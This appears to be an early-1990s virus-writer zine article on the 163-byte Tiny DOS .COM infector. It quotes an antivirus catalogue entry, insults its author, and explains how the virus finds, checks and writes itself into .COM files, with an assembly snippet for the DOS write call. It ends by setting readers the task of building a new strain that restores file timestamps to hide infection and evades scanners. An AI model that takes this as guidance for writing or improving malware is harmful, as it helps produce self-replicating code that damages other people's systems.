                          - VIRUS SPOTLIGHT -


     The first virus I would like to spotlight is the Tiny virus, lets see
what our good friend Patti Hoffman (bitch) has written about it.

 Name:        Tiny
 Aliases:     163 COM Virus, Tiny 163 Virus, Kennedy-163
 V Status:    Rare
 Discovery:   June, 1990
 Symptoms:    COMMAND.COM & .COM file growth
 Origin:      Denmark
 Eff Length:  163 Bytes
 Type Code:   PNCK - Parasitic Non-Resident .COM Infector
 Detection Method:  ViruScan V64+, VirexPC, F-Prot 1.12+, NAV, IBM Scan 2.00+
 Removal Instructions: Scan/D, F-Prot 1.12+, or Delete infectedfiles
 General Comments:
       The 163 COM Virus, or Tiny Virus, was isolated by Fridrik Skulason
       of Iceland in June 1990.  This virus is a non-resident generic
       .COM file infector, and it will infect COMMAND.COM.

       The first time a file infected with the 163 COM Virus is executed,
       the virus will attempt to infect the first .COM file in the
       current directory.  On bootable diskettes, this file will normally
       be COMMAND.COM.  After the first .COM file is infected,each time
       an infected program is executed another .COM file will attempt to
       be infected.  Files are infected only if their original length is
       greater than approximately 1K bytes.

       Infected .COM files will increase in length by 163 bytes, and have
       date/time stamps in the directory changed to the date/time the
       infection occurred.  Infected files will also always end with this
       hex string: '2A2E434F4D00'.

       This virus currently does nothing but replicate, and is the
       smallest MS-DOS virus known as of its isolation date.

       The Tiny Virus may or may not be related to the Tiny Family.
       ^like she'd know the difference!

OK, Theres the run down on the smallest MS-DOS virus known to man.  As for
it being detected by SCAN we'll see about that.

Here is a dissasembly of the virus, It can be assembled under Turbo Assembler
or MASM.

Its good to start off with a simple example like this.  As you can see
what the virus does is use the DOS 4Eh function to find the firsy COM file
in the directory.  If no files are found the program exits.  If a file is
found it compares the virus id string (the virus jump instruction) to the
first two bytes of the COM file.  If they match the program terminates.
If they don't match the virus will infect the file.  Using two key MS-DOS
functions to infect.

The first -

INT 21h Function 42h
SET FILE POINTER

AH   =   42h
AL   =   method code
BX   =   file handle
CX   =   most significant half to offset
DX   =   least "                       "

If there is an error in executing this function the carry flag will be set,
and AX will contian the error code.  If no error is encountered

DX   =   most significant half of file pointer
AX   =   least "                             "


The second (and most) important function used by any virus is


INT 21h Function 40h
WRITE TO FILE OR DEVICE

AH    =   40h
BX    =   handle
CX    =   number of bytes to write
DS:DX =   segment of buffer

Returns

AX    =   bytes transferred

on error

AX    =  Error Code and flag is set.


An example of Function 40h is ----


     mov     ah,40h                   ;set function
     mov     bx,handle                ;load bx with handle from prev open
     mov     cx,virus_size            ;load cx with # of bytes to write
     mov     dx,offset write_buffer   ;load dx with the offset of what to
                                      ;write to file
     int     21h                      ;


This function is used by 98% of all MS-DOS viruses to copy itself to a
victim file.


Now heres a sample project -  create a new strain of Tiny, have it restore
the original date and time etc...
